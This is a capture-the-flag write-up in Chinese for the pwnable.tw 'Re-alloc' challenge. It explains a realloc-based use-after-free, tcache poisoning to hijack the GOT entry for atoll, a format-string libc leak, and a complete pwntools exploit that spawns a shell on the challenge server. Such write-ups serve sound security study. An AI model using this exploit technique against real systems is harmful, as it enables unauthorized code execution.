# pwnable.tw-Re-alloc

## checksec 

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = realloc(0LL, size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```

**edit**

```c
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], (unsigned int)size);
}
```

**free**

```c
int rfree()
{
  _QWORD *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc((void *)heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (int)v0;
}
```

程序的各种功能都是由`realloc`来实现的。`realloc`有两个参数`ptr`与`size`：

- `ptr == NULL`：其与`malloc`**等价**
- `ptr != NULL`:
  - `new size == old size`：直接将`ptr`返回。
  - `new size < old size`：将`ptr`进行分割，剩余部分若大于最小chunk的大小就会被free
  - `new size > old size`：调用`malloc`申请一块新的内存，拷贝数据后将`old ptr`释放
  - `new size == 0`：与`free`**等价**

在`edit`中，若`new size`为0，就相当于对chunk进行了free，free的返回值为0。程序进行了返回，没有将原来的指针进行更新，所以我们可以进行UAF。

got表可写，但是没有show函数，先想办法通过修改got表进行leak。计划修改`atoll_got`为`printf_plt`，我们就可以通过格式化字符串漏洞来泄露got表中的地址，从而leak libc。

首先，申请一个chunk，使用`edit`将其free，并修改其`fd`指向`atoll_got`。然后，再将这个chunk申请回来，这时`next`就会被填入`atoll_got`。为了不影响最开始的这个`tcache bin`，我们`realloc`这个chunk，为一个新大小，然后free掉。这时，这个chunk的key被清空了，但是heap数组中还有这个chunk的指针，而且我么没法直接覆盖，所以我们再次通过`realloc`修改器key域为垃圾数据，将其free就可以清空heap数组了。最后，一个`tcache bin`的`next`不为`NULL`但是count为0，之后再申请对应的大小就会让count造成溢出。

在leak libc后，还要再次进行修改，所以我们再次使用上述操作，使另一个`tcache bin`的`next`指向`atoll_got`。

## exp

```python
from pwn import *
#from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

binary='./re-alloc'
#gdb.attach(sh)
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw', 10106)

elf = ELF(binary,checksec=False)
libc = ELF('libc.so',checksec=False)

def add(idx,size,data):
	sh.sendlineafter('choice: ','1')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	sh.sendafter('Data:',data)

def edit(idx,size,data):
	sh.sendlineafter('choice: ','2')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	if size != 0:
		sh.sendafter('Data:',data)

def dele(idx):
	sh.sendlineafter('choice: ','3')
	sh.sendlineafter('Index:',str(idx))	

atoll_got = elf.got['atoll']
printf_plt = elf.plt['printf']

add(0,0x18,'a'*0x8)
edit(0,0,'')
edit(0,0x18,p64(atoll_got))
add(1,0x18,'a'*0x8)
edit(0,0x38,'a'*8)
dele(0)
edit(1,0x38,'b'*0x10)
dele(1)

add(0,0x48,'a'*0x8)
edit(0,0,'')
edit(0,0x48,p64(atoll_got))
add(1,0x48,'a'*0x8)
edit(0,0x58,'a'*8)
dele(0)
edit(1,0x58,'b'*0x10)
dele(1)

add(0,0x48,p64(printf_plt))
sh.sendlineafter('choice: ','1')
sh.recvuntil("Index:")
sh.sendline('%6$p')
stdout_addr = int(sh.recv(14),16)
libc.address=stdout_addr -libc.sym['_IO_2_1_stdout_']
info("libc: "+hex(libc.address))
sh.sendlineafter('choice: ','1')
sh.recvuntil(":")
sh.sendline('a'+'\x00')
sh.recvuntil(":")
sh.send('a'*15+'\x00')
sh.recvuntil("Data:")
sh.send(p64(libc.sym['system']))

# gdb.attach(p)
sh.sendlineafter('choice: ','3')
sh.recvuntil("Index:")
sh.sendline("/bin/sh\x00")
sh.interactive()

```

由于延迟原因（~~辣鸡校园网~~，建议使用`sh.recvuntil('xxx');sh.send('xxx')`而不是`sendlineafter`。

